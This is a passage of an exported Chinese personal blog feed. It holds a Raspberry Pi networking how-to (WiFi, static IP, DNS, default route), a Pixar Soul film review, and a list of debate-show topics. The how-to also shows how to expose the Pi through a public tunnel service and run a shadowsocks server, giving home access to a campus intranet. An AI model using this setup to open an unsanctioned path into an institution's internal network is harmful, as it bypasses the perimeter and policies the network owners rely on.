	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, &quot;Segoe WPC&quot;, &quot;Segoe UI&quot;, &quot;Ubuntu&quot;, &quot;Droid Sans&quot;, sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
&#125;

#code-csp-warning &#123;
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
&#125;

#code-csp-warning:hover &#123;
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
&#125;

body.scrollBeyondLastLine &#123;
	margin-bottom: calc(100vh - 22px);
&#125;

body.showEditorSelection .code-line &#123;
	position: relative;
&#125;

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before &#123;
	content: &quot;&quot;;
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
&#125;

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before &#123;
	left: -30px;
&#125;

.vscode-light.showEditorSelection .code-active-line:before &#123;
	border-left: 3px solid rgba(0, 0, 0, 0.15);
&#125;

.vscode-light.showEditorSelection .code-line:hover:before &#123;
	border-left: 3px solid rgba(0, 0, 0, 0.40);
&#125;

.vscode-light.showEditorSelection .code-line .code-line:hover:before &#123;
	border-left: none;
&#125;

.vscode-dark.showEditorSelection .code-active-line:before &#123;
	border-left: 3px solid rgba(255, 255, 255, 0.4);
&#125;

.vscode-dark.showEditorSelection .code-line:hover:before &#123;
	border-left: 3px solid rgba(255, 255, 255, 0.60);
&#125;

.vscode-dark.showEditorSelection .code-line .code-line:hover:before &#123;
	border-left: none;
&#125;

.vscode-high-contrast.showEditorSelection .code-active-line:before &#123;
	border-left: 3px solid rgba(255, 160, 0, 0.7);
&#125;

.vscode-high-contrast.showEditorSelection .code-line:hover:before &#123;
	border-left: 3px solid rgba(255, 160, 0, 1);
&#125;

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before &#123;
	border-left: none;
&#125;

img &#123;
	max-width: 100%;
	max-height: 100%;
&#125;

a &#123;
	text-decoration: none;
&#125;

a:hover &#123;
	text-decoration: underline;
&#125;

a:focus,
input:focus,
select:focus,
textarea:focus &#123;
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
&#125;

hr &#123;
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
&#125;

h1 &#123;
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
&#125;

h1, h2, h3 &#123;
	font-weight: normal;
&#125;

table &#123;
	border-collapse: collapse;
&#125;

table &gt; thead &gt; tr &gt; th &#123;
	text-align: left;
	border-bottom: 1px solid;
&#125;

table &gt; thead &gt; tr &gt; th,
table &gt; thead &gt; tr &gt; td,
table &gt; tbody &gt; tr &gt; th,
table &gt; tbody &gt; tr &gt; td &#123;
	padding: 5px 10px;
&#125;

table &gt; tbody &gt; tr + tr &gt; td &#123;
	border-top: 1px solid;
&#125;

blockquote &#123;
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
&#125;

code &#123;
	font-family: Menlo, Monaco, Consolas, &quot;Droid Sans Mono&quot;, &quot;Courier New&quot;, monospace, &quot;Droid Sans Fallback&quot;;
	font-size: 1em;
	line-height: 1.357em;
&#125;

body.wordWrap pre &#123;
	white-space: pre-wrap;
&#125;

pre:not(.hljs),
pre.hljs code &gt; div &#123;
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
&#125;

pre code &#123;
	color: var(--vscode-editor-foreground);
	tab-size: 4;
&#125;

&#x2F;** Theming *&#x2F;

.vscode-light pre &#123;
	background-color: rgba(220, 220, 220, 0.4);
&#125;

.vscode-dark pre &#123;
	background-color: rgba(10, 10, 10, 0.4);
&#125;

.vscode-high-contrast pre &#123;
	background-color: rgb(0, 0, 0);
&#125;

.vscode-high-contrast h1 &#123;
	border-color: rgb(0, 0, 0);
&#125;

.vscode-light table &gt; thead &gt; tr &gt; th &#123;
	border-color: rgba(0, 0, 0, 0.69);
&#125;

.vscode-dark table &gt; thead &gt; tr &gt; th &#123;
	border-color: rgba(255, 255, 255, 0.69);
&#125;

.vscode-light h1,
.vscode-light hr,
.vscode-light table &gt; tbody &gt; tr + tr &gt; td &#123;
	border-color: rgba(0, 0, 0, 0.18);
&#125;

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table &gt; tbody &gt; tr + tr &gt; td &#123;
	border-color: rgba(255, 255, 255, 0.18);
&#125;

&lt;&#x2F;style&gt;

&lt;style&gt;
&#x2F;* Tomorrow Theme *&#x2F;
&#x2F;* http:&#x2F;&#x2F;jmblog.github.com&#x2F;color-themes-for-google-code-highlightjs *&#x2F;
&#x2F;* Original theme - https:&#x2F;&#x2F;github.com&#x2F;chriskempson&#x2F;tomorrow-theme *&#x2F;

&#x2F;* Tomorrow Comment *&#x2F;
.hljs-comment,
.hljs-quote &#123;
	color: #8e908c;
&#125;

&#x2F;* Tomorrow Red *&#x2F;
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion &#123;
	color: #c82829;
&#125;

&#x2F;* Tomorrow Orange *&#x2F;
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link &#123;
	color: #f5871f;
&#125;

&#x2F;* Tomorrow Yellow *&#x2F;
.hljs-attribute &#123;
	color: #eab700;
&#125;

&#x2F;* Tomorrow Green *&#x2F;
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition &#123;
	color: #718c00;
&#125;

&#x2F;* Tomorrow Blue *&#x2F;
.hljs-title,
.hljs-section &#123;
	color: #4271ae;
&#125;

&#x2F;* Tomorrow Purple *&#x2F;
.hljs-keyword,
.hljs-selector-tag &#123;
	color: #8959a8;
&#125;

.hljs &#123;
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
&#125;

.hljs-emphasis &#123;
	font-style: italic;
&#125;

.hljs-strong &#123;
	font-weight: bold;
&#125;
&lt;&#x2F;style&gt;

&lt;style&gt;
&#x2F;*
 * Markdown PDF CSS
 *&#x2F;

 body &#123;
	font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe WPC&quot;, &quot;Segoe UI&quot;, &quot;Ubuntu&quot;, &quot;Droid Sans&quot;, sans-serif, &quot;Meiryo&quot;;
	padding: 0 12px;
&#125;

pre &#123;
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
&#125;

pre:not(.hljs) &#123;
	padding: 23px;
	line-height: 19px;
&#125;

blockquote &#123;
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
&#125;

.emoji &#123;
	height: 1.4em;
&#125;

code &#123;
	font-size: 14px;
	line-height: 19px;
&#125;

&#x2F;* for inline code *&#x2F;
:not(pre):not(.hljs) &gt; code &#123;
	color: #C9AE75; &#x2F;* Change the old color so it seems less like an error *&#x2F;
	font-size: inherit;
&#125;

&#x2F;* Page Break : use &lt;div class&#x3D;&quot;page&quot;&#x2F;&gt; to insert page break
-------------------------------------------------------- *&#x2F;
.page &#123;
	page-break-after: always;
&#125;

&lt;&#x2F;style&gt;

&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;mermaid&#x2F;dist&#x2F;mermaid.min.js&quot;&gt;&lt;&#x2F;script&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
  &lt;script&gt;
    mermaid.initialize(&#123;
      startOnLoad: true,
      theme: document.body.classList.contains(&#39;vscode-dark&#39;) || document.body.classList.contains(&#39;vscode-high-contrast&#39;)
          ? &#39;dark&#39;
          : &#39;default&#39;
    &#125;);
  &lt;&#x2F;script&gt;
&lt;h1 id&#x3D;&quot;quantum-mini-linux%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE&quot;&gt;Quantum-Mini-Linux—网络配置&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;files.seeedstudio.com&#x2F;wiki&#x2F;Quantum-Mini-Linux-Dev-Kit&#x2F;Quantum-Mini-Linux-Dev-Kit.png&quot; alt&#x3D;&quot;&quot;&gt;&lt;&#x2F;p&gt;
&lt;h2 id&#x3D;&quot;wifi%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%AE%BE%E7%BD%AE&quot;&gt;wifi账号密码设置&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;code&gt;sudo vi &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;修改如下的文件中的部分数据。&lt;&#x2F;p&gt;
&lt;pre class&#x3D;&quot;hljs&quot;&gt;&lt;code&gt;&lt;div&gt; network&#x3D;&#123;

                ssid&#x3D;&quot;[你的网络名称]&quot;

                psk&#x3D;&quot;[你的网络密码]&quot;

 

         &#125;
&lt;&#x2F;div&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;如图&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;exp-picture.cdn.bcebos.com&#x2F;a44e8afc508c9bcec61993c2d6dd884ce44afa75.jpg?x-bce-process&#x3D;image&#x2F;resize,m_lfit,w_500,limit_1&#x2F;format,f_jpg&#x2F;quality,q_80&quot; alt&#x3D;&quot;&quot;&gt;&lt;&#x2F;p&gt;
&lt;h2 id&#x3D;&quot;%E5%AF%B9%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E9%85%8D%E7%BD%AE&quot;&gt;对本地网络地址进行配置&lt;&#x2F;h2&gt;
&lt;p&gt;由于在实验室，所用的路由器的端口号是10.xxx.xxx.xxx 然后直接ip连接到了该位置，这肯定有问题。&lt;&#x2F;p&gt;
&lt;pre class&#x3D;&quot;hljs&quot;&gt;&lt;code&gt;&lt;div&gt;sudo nano &#x2F;etc&#x2F;network&#x2F;interfaces
&lt;&#x2F;div&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;修改以下内容设置默认网关，具体数值可以根据自身情况修改&lt;&#x2F;p&gt;
&lt;pre class&#x3D;&quot;hljs&quot;&gt;&lt;code&gt;&lt;div&gt;auto lo
iface lo inet loopback
auto enxb827bb3ef8a  &#x2F;&#x2F;就是前面查看的名字
iface enxb827bb3ef8a inet static
address 192.168.1.2    &#x2F;&#x2F;IP地址
netmask 255.255.255.0    &#x2F;&#x2F;掩码
gateway 192.168.1.1     &#x2F;&#x2F;网关
&lt;&#x2F;div&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id&#x3D;&quot;%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F&quot;&gt;查看是否连接成功&lt;&#x2F;h2&gt;
&lt;p&gt;ping 192.168.1.2可以但是无法ping www.baidu.com&lt;&#x2F;p&gt;
&lt;p&gt;报错，unknown host www.baidu.com&lt;&#x2F;p&gt;
&lt;h2 id&#x3D;&quot;%E8%AE%BE%E7%BD%AE%E7%AB%AF%E5%8F%A3&quot;&gt;设置端口&lt;&#x2F;h2&gt;
&lt;pre class&#x3D;&quot;hljs&quot;&gt;&lt;code&gt;&lt;div&gt;sudo vi &#x2F;etc&#x2F;resolv.conf
&lt;&#x2F;div&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;如果你们网络不行的话，那么一定是这个nameserver的问题。&lt;&#x2F;p&gt;
&lt;p&gt;所以，修改&lt;&#x2F;p&gt;
&lt;p&gt;直接在那里面修改。&lt;&#x2F;p&gt;
&lt;p&gt;改成8.8.8.8&lt;&#x2F;p&gt;
&lt;p&gt;:wq保存就可以了。&lt;&#x2F;p&gt;
&lt;p&gt;但是尝试后发现不是因为dns域名解析的问题。&lt;&#x2F;p&gt;
&lt;h2 id&#x3D;&quot;windows%E6%89%BE%E5%88%B0wwwbaiducom%E7%9A%84ip%E5%9C%B0%E5%9D%80&quot;&gt;windows找到www.baidu.com的ip地址&lt;&#x2F;h2&gt;
&lt;pre class&#x3D;&quot;hljs&quot;&gt;&lt;code&gt;&lt;div&gt;win+R

cmd

ping www.baidu.com

&lt;&#x2F;div&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;百度的地址为14.215.177.39&lt;&#x2F;p&gt;
&lt;p&gt;用linux ping该地址，发现还是无法连接，证明linux没有连接到外网。&lt;&#x2F;p&gt;
&lt;h2 id&#x3D;&quot;linux%E5%A2%9E%E5%8A%A0%E8%B7%AF%E7%94%B1&quot;&gt;linux增加路由&lt;&#x2F;h2&gt;
&lt;p&gt;由于linux无法ping通外网，搜索后发现&lt;&#x2F;p&gt;
&lt;p&gt;route&lt;&#x2F;p&gt;
&lt;p&gt;查看路由表，很神奇的是路由表是空的，于是在思考后。&lt;&#x2F;p&gt;
&lt;p&gt;route add default gw 192.168.1.1&lt;&#x2F;p&gt;
&lt;p&gt;route&lt;&#x2F;p&gt;
&lt;p&gt;成功解决树莓派无法上网问题。&lt;&#x2F;p&gt;
&lt;p&gt;shutdown -r now&lt;&#x2F;p&gt;
&lt;h2 id&#x3D;&quot;%E9%80%9A%E8%BF%87putty%E5%8F%AF%E4%BB%A5%E4%BB%8E%E5%B1%80%E5%9F%9F%E7%BD%91ssh%E8%AE%BF%E9%97%AElinux%E5%8F%82%E8%80%83linux%E8%BF%9E%E6%8E%A5%E6%96%B9%E6%B3%95&quot;&gt;通过putty可以从局域网ssh访问linux参考linux连接方法&lt;&#x2F;h2&gt;

&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个是这篇文章的html文件可以直接down我这个网页的html。</p>
<p>展示效果如下所示：</p>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="获取域名（内网穿透）"><a href="#获取域名（内网穿透）" class="headerlink" title="获取域名（内网穿透）"></a>获取域名（内网穿透）</h3><p>好文请先阅读<br><a href="https://blog.csdn.net/Mind_programmonkey/article/details/80285596">https://blog.csdn.net/Mind_programmonkey/article/details/80285596</a></p>
<h3 id="获取域名"><a href="#获取域名" class="headerlink" title="获取域名"></a>获取域名</h3><p>简而言之就是树莓派（及所在网域）没有公网IP，必须先委托代理商做一个映射，在树莓派上道代理商客户端实时告知代理服务器自己的IP，代理服务器（相当于DNS服务器）将域名转换为树莓派IP再告知访问者浏览器</p>
<p>获取方法 ngrok <a href="https://www.ngrok.cc/">https://www.ngrok.cc/</a> （免费内网穿透）</p>
<ol>
<li><p>注册-&gt;申请隧道-&gt;http、tcp 都行</p>
</li>
<li><p>验证用户名，密码可填可不填（填上相当于私有）</p>
</li>
<li><p>树莓派上安装客户端 <a href="https://www.ngrok.cc/download.html">https://www.ngrok.cc/download.html</a> 选 Linux ARM版本</p>
</li>
<li><p>解压，不需要安装</p>
</li>
<li><p>参考 <a href="https://www.sunnyos.com/article-show-67.html">https://www.sunnyos.com/article-show-67.html</a></p>
</li>
<li><p>此后我们获得一个隧道 ID</p>
</li>
</ol>
<h3 id="树莓派终端中运行以下命令"><a href="#树莓派终端中运行以下命令" class="headerlink" title="树莓派终端中运行以下命令"></a>树莓派终端中运行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;home&#x2F;pi&#x2F;Dowmloads&#x2F;linux_arm #进入客户端文件夹
ls  # ls查看sunny文件
.&#x2F;sunny clientid 隧道id #执行命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>出现以下界面就表示内网穿透好了，保持运行</p>
<p>如图，表示隧道把 free.idcfengye.com(对应一个公网IP)的19434 端口（如果是http的话就是80端口）映射到127.0.0.1（一个特殊的IP，代表本机）的5228端口。此后，在外网请 free.idcfengye.com:19434 相当于请求本机的 5228 端口 了。</p>
<p>提示：</p>
<pre class="line-numbers language-none"><code class="language-none">setsid &#x2F;home&#x2F;pi&#x2F;ngrok&#x2F;linux_arm&#x2F;sunny clientid   隧道id  &amp;#可以后台启动内网穿透<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>setsid /home/pi/ngrok/linux_arm/sunny clientid   id </p>
<h2 id="自制校园V-N"><a href="#自制校园V-N" class="headerlink" title="自制校园V*N"></a>自制校园V*N</h2><h1 id="安装工具："><a href="#安装工具：" class="headerlink" title="安装工具："></a>安装工具：</h1><p>假如我们想在家里下载学校内网的资源，就需要一个代理服务器在学校内网运行，将tcp请求转发到外网。类似于科学上网的服务器在境外工作，将tcp请求通过合法的网络连接转发到国内。我们用shadowscoks实现这个代理功能。<br><a href="https://github.com/shadowsocks/shadowsocks/wiki/Shadowsocks-使用说明">https://github.com/shadowsocks/shadowsocks/wiki/Shadowsocks-使用说明</a></p>
<pre class="line-numbers language-none"><code class="language-none">sudo pip install --upgrade pip

pip install shadowsocks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>配置</p>
<p><a href="https://github.com/shadowsocks/shadowsocks/wiki/Configuration-via-Config-File">https://github.com/shadowsocks/shadowsocks/wiki/Configuration-via-Config-File</a></p>
<p>在服务端（也就是树莓派啦）</p>
<p>新建文件 /etc/shadowsocks.json</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;server&quot;:&quot;my_server_ip&quot;,
    &quot;server_port&quot;:8388,
    &quot;local_address&quot;: &quot;127.0.0.1&quot;,
    &quot;local_port&quot;:1080,
    &quot;password&quot;:&quot;mypassword&quot;,
    &quot;timeout&quot;:300,
    &quot;method&quot;:&quot;aes-256-cfb&quot;,
    &quot;fast_open&quot;: false
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意：<br>如果是通过隧道连接外网的话：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>项目</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>my_server_ip</td>
<td>填127.0.0.1</td>
</tr>
<tr>
<td>server_port</td>
<td>填tcp 隧道端口，如5228</td>
</tr>
<tr>
<td>local_address</td>
<td>不管</td>
</tr>
<tr>
<td>local_port</td>
<td>不管</td>
</tr>
<tr>
<td>password</td>
<td>自定义，服务器密码</td>
</tr>
<tr>
<td>timeout</td>
<td>默认即可</td>
</tr>
<tr>
<td>method</td>
<td>默认即可，客户端需保持一致</td>
</tr>
<tr>
<td>fast_open</td>
<td>true，可能降低延迟</td>
</tr>
</tbody>
</table>
</div>
<p>运行</p>
<pre class="line-numbers language-none"><code class="language-none">ssserver -c &#x2F;etc&#x2F;shadowsocks.json #要在前台运行
ssserver -c &#x2F;etc&#x2F;shadowsocks.json -d start#要在后台运行
ssserver -c &#x2F;etc&#x2F;shadowsocks.json -d stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="配置为启动脚本"><a href="#配置为启动脚本" class="headerlink" title="配置为启动脚本"></a>配置为启动脚本</h2><p>配置为启动脚本，方便开机启动</p>
<p>创建/usr/ss.sh</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
setsid &#x2F;home&#x2F;pi&#x2F;Dowmloads&#x2F;linux_arm&#x2F;sunny clientid 隧道id &amp;#启动内网穿透
ssserver -c &#x2F;etc&#x2F;ssserver.json -d restart &amp; #启动ss-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在exit 0 前添加</p>
<p>/usr/./ss.sh<br><pre class="line-numbers language-none"><code class="language-none">systemctl start rc-local.service #测试，不能有错误
systemctl status rc-local.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>本文参考<br>-<a href="https://blog.csdn.net/zb12138/article/details/88945966">树莓派实现简单网站服务器</a></p>
]]></content>
      <categories>
        <category>服务器内网穿透</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SOUL</title>
    <url>/2020/12/30/SOUL/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="灵魂奇遇"><a href="#灵魂奇遇" class="headerlink" title="灵魂奇遇"></a><center>灵魂奇遇</center></h1><h2 id="SOUL"><a href="#SOUL" class="headerlink" title=" SOUL "></a><center> SOUL </center></h2><center>
<div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=754554736&bvid=BV1yk4y1y7hy&cid=236313832&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"
    style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>

</center>

<span id="more"></span>
<h3 id="影评"><a href="#影评" class="headerlink" title="影评"></a>影评</h3><p>&nbsp;&nbsp;已经几年没有为电影写日志了。今年没几次来影院，但是在2020的倒数- - 第二天我发现了一部不错的电影。</p>
<p>&nbsp;&nbsp;彼特·道格特的《灵魂奇遇》所触动，重新引发对人生意义、目标和梦想的思考。</p>
<p>&nbsp;&nbsp;最近一直在思考人生的意义，看当下的力量、遗愿清单，奇葩说有一场辩题——终其一生只是个平凡人，你后悔吗？，我一次次的问自己，究竟人生的意义是什么？ </p>
<p>&nbsp;&nbsp;电影里有一句话“有一条鱼说它的一生最大的愿望就是去往海洋，一天鲸鱼对它说你就在海洋里啊，小鱼却认为这只是水并不是海洋。” 身边有很多朋友，读研究生，每天希望自己可以毕业去工作。去工作的说自己不想被老板压榨，想读书。都希望达到下一个目标的时间节点。我也会经常以未来为标定，因为以终为始我们更容易获得成功。但是我发现，这项技能反而让我们错过了无数个令人感动的瞬间。再一次次追逐中，我们错过了无数个清晨里的- - 第一缕阳光，错过了日落的最后一抹晚霞。我们就像一条鱼，在海洋里追逐海洋，而一次又一次的错过。也许你到达了下一刻你也不会收获你想要的幸福，你的幸福在当下而绝不在你期待的未来。</p>
<p>&nbsp;&nbsp;如果今天就是你的最后一天，你会遗憾吗？你会后悔吗？如果每一分钟都期待下一分钟，每一天都期待明天，我想我一定会后悔。 </p>
<p>&nbsp;&nbsp;Our lives are streams flowing into the same river towards whatever heaven lies in the mist beyond the falls. </p>
<p>李诞说开心点，人间不值得。</p>
<p>我想说开心点，人间值得。<br><img src="https://pic4.zhimg.com/80/v2-c870fe97404f040e158055238434d2e8_1440w.jpg?source=1940ef5c" alt=""></p>
<h3 id="遗愿清单"><a href="#遗愿清单" class="headerlink" title="遗愿清单"></a><a href="https://www.bilibili.com/bangumi/play/ss32422/?from=search&amp;seid=17447715110951646953">遗愿清单</a></h3><h3 id="当下的力量"><a href="#当下的力量" class="headerlink" title="当下的力量"></a><a href="http://dushu.baidu.com/pc/detail?gid=4305615696">当下的力量</a></h3><h3 id="终其一生只是个平凡人，你后悔吗？"><a href="#终其一生只是个平凡人，你后悔吗？" class="headerlink" title="终其一生只是个平凡人，你后悔吗？"></a><a href="https://www.iqiyi.com/v_19rwbd2k7g.html#curid=11572260000_af2cedad8878bd4e2e1fe629784b6f6e">终其一生只是个平凡人，你后悔吗？</a></h3><h2 id="奇葩说论题汇总"><a href="#奇葩说论题汇总" class="headerlink" title="奇葩说论题汇总"></a>奇葩说论题汇总</h2><h3 id="《奇葩说》-第六季："><a href="#《奇葩说》-第六季：" class="headerlink" title="《奇葩说》- 第六季："></a>《奇葩说》- 第六季：</h3><ul>
<li><p>第1期辩题「正确的废话还要说吗？」</p>
</li>
<li><p>第2期辩题「异地恋伴侣反对和异性合租要不要搬家？」</p>
</li>
<li><p>第3期辩题「年纪轻轻精致穷我错了吗？」</p>
</li>
<li><p>第4期辩题「美术馆着火，救画 or 救猫」，艺术与生命，你选择哪个？</p>
</li>
<li><p>第5期辩题「感兴趣的工作总是 996 ，我该不该 886 （说再见）」</p>
</li>
<li><p>第6期辩题「大学开恋爱必修课」，你支持吗？</p>
</li>
<li><p>第7期的辩题「将给做好事的人发红包，你支持吗？」</p>
</li>
<li><p>第8期辩题「恋爱多年我却恐婚，如果有去除恐婚水，我要喝吗？」</p>
</li>
<li><p>第9期辩题「伴侣有个异性 soul mate 」，该介意吗？</p>
</li>
<li><p>第 10 期辩题「父母该不该告诉孩子，童话都是假的？」</p>
</li>
<li><p>第 11 期辩题「毕业后过得很拮据，父母愿意让我啃老」，该啃吗？</p>
</li>
<li><p>第 12 期辩题「奇葩星球设立颜值税」，你支持吗？</p>
</li>
<li><p>第 13 期辩题「伴侣想当咸鱼」，该鞭策还是接受？</p>
</li>
<li><p>第 14 期辩题「爱人离世，你会把TA的记忆交给AI吗」？</p>
</li>
<li><p>第 15 期辩题，你会放下一切，跟着伴侣去大城市吗？</p>
</li>
<li><p>第 16 期辩题「临死前，你会选择冷冻自己送到 100 年之后吗？」，你怎么选？</p>
</li>
<li><p>第 17 期辩题「穿热裤被男友阻止」，我要改吗？</p>
</li>
<li><p>第 18 期辩题「离婚要等孩子高考后吗？」，你怎么看？</p>
</li>
<li><p>第 19 期辩题「生二胎需要经过老大同意吗？」，你怎么看？</p>
</li>
<li><p>第 20 期辩题「读心术胶囊」，你要吃吗？</p>
</li>
<li><p>第 21 期辩题：「妈妈是超人」这句话真的是对妈妈的赞美吗？</p>
</li>
<li><p>第 22 期辩题「对事不对人」，真的 ok 吗？</p>
</li>
<li><p>第 23 期辩题，「父母观念过时还固执己见，我该闭嘴还是说服」</p>
</li>
<li><p>第 24 期辩题，「终其一生只是个平凡人,你会后悔吗？」</p>
</li>
</ul>
